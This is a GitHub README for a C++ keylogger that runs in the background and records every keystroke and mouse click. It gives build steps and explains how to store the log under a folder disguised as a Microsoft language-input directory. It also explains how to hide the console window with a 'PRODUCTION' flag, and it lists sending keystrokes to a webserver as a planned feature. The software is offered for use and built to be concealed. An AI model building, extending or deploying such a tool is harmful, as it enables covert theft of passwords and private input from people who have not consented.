# C++ Keylogger

Simple Keylogger made using C++, runs in background and records and stores all Keyboard input events as well as mouse clicks


https://user-images.githubusercontent.com/37842304/196162345-85d96b9d-bd28-44df-b834-6e9288a2dffb.mp4


__Keystrokes saved to file__

![image](https://user-images.githubusercontent.com/37842304/195666013-f1575d2e-aab7-49e7-bf25-d7391073e359.png)


## Changing Functionality

to change the log file name and path edit the following lines in `CppKeyLogger.cpp`

```cpp
#define LOG_LOCATION "C:\\Users\\harsj\\AppData\\Local\\Microsoft\\input\\ar-QA\\"
#define LOG_FILENAME "lang.txt"
```

change `#define PRODUCTION false` to `#define PRODUCTION true` to hide the console window when executing the exe

## Building using CMake

```console
git clone https://github.com/HarshitJoshi9152/CppKeyLogger/
cd CppKeyLogger
cmake .
```

Open `./CppKeyLogger.sln` in Visual Studio 2022 and set CppKeyLogger as Startup Project, click start button to run the exe generated

# Roadmap

Features to be implemented soon...

- Sending Keystrokes to a webserver
- Recording more detailed Mouse inputs
- Optimise for lower CPU usage


